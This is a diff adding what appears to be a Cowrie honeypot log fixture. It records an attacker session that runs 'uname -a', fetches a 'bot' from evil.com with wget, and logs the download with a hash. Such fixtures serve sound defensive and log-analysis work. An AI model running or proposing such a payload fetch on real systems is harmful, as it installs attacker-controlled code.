@@ -1,0 +1,9 @@
+{
+  "src_ip": "123.123.123.123",
+  "timestamp": "2025-09-22T14:10:00Z",
+  "log": [
+    {"eventid": "cowrie.session.input", "input": "uname -a"},
+    {"eventid": "cowrie.session.input", "input": "wget http://evil.com/bot"},
+    {"eventid": "cowrie.file_download", "shasum": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "url": "http://evil.com/bot"}
+  ]
+}
